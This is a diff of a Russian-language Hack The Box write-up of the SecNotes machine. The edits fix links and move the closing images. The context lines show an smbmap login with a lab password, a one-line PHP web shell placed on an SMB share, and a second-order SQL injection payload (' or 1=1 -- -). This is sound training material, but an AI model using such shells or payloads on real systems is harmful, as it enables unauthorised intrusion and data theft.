@@ -214,7 +214,7 @@ XSRF в первозданном виде!
 
 Очень похоже на расшаренный SMB-ресурс.
 
-С помощью smbmap (о котором я рассказывал в [райтапе](https://snovvcrash.github.io/2018/12/17/htb-active-write-up.html#smbmap "HTB{ Active } / snovvcrash’s Security Blog") на Active) посмотрим, к чему у нас есть доступ:
+С помощью smbmap (о котором я рассказывал в [райтапе](https://snovvcrash.github.io/2018/12/17/htb-active.html#smbmap "HTB{ Active } / snovvcrash’s Security Blog") на Active) посмотрим, к чему у нас есть доступ:
 ```text
 root@kali:~# smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&'
 [+] Finding open SMB ports....
@@ -249,7 +249,7 @@ smb: \> ls
 
 # Шелл от имена Тайлера
 ## Web-Shell
-Так как мы имеем доступ на чтение в директорию `\new-site`, дропнем туда простой веб-шелл на PHP с помощью [smbclient](https://snovvcrash.github.io/2018/12/17/htb-active-write-up.html#smbclient "HTB{ Active } / snovvcrash’s Security Blog"):
+Так как мы имеем доступ на чтение в директорию `\new-site`, дропнем туда простой веб-шелл на PHP с помощью [smbclient](https://snovvcrash.github.io/2018/12/17/htb-active.html#smbclient "HTB{ Active } / snovvcrash’s Security Blog"):
 ```text
 root@kali:~# cat webshell.php
 <?php system($_REQUEST['cmd']); ?>
@@ -526,7 +526,16 @@ C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\root.txt
 7250cde1????????????????????????
 ```
 
-Готово :triumph:
+Keep your notes **truly** secure :triumph:
+
+![owned-user.png]({{ "/img/htb/boxes/secnotes/owned-user.png" | relative_url }})
+{: .center-image}
+
+![owned-root.png]({{ "/img/htb/boxes/secnotes/owned-root.png" | relative_url }})
+{: .center-image}
+
+![trophy.png]({{ "/img/htb/boxes/secnotes/trophy.png" | relative_url }})
+{: .center-image}
 
 # Эпилог
 ## secnotes_reverse_tcp.sh
@@ -765,14 +774,3 @@ if (mysqli_num_rows($res) > 0) {
 ```
 
 В процессе загрузки заметок из базы данных для текущего пользователя фильтрация ввода не осуществляется, что делает SQL-инъекцию второго порядка возможной: если нарушитель заранее зарегистрирует имя пользователя `' or 1=1 -- -`, то вышеобозначенный сегмент кода сделает запрос к БД вида `SELECT id, title, note, created_at FROM posts WHERE username = '' or 1=1 -- -'`, что и будет являться классической инъекцией.
-
-Keep your notes **truly** secure :innocent:
-
-![owned-user.png]({{ "/img/htb/boxes/secnotes/owned-user.png" | relative_url }})
-{: .center-image}
-
-![owned-root.png]({{ "/img/htb/boxes/secnotes/owned-root.png" | relative_url }})
-{: .center-image}
-
-![trophy.png]({{ "/img/htb/boxes/secnotes/trophy.png" | relative_url }})
-{: .center-image}
